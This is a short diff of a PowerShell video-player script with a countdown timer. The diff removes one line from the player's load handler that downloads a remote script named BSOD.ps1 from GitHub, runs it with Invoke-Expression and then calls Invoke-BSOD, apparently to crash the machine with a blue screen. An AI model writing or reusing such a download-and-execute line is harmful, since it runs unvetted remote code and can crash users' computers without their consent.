@@ -47,7 +47,6 @@ $Timer.Add_Tick({
 # Start the countdown timer after the video starts playing
 $VideoPlayer.Add_Loaded({
     $Timer.Start()
-    Invoke-Expression ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/YeetTheAnson/vineboom/main/shortcutactivation/BlueScreen/BSOD.ps1'));Invoke-BSOD
 })
 
 # Show Up the Window 
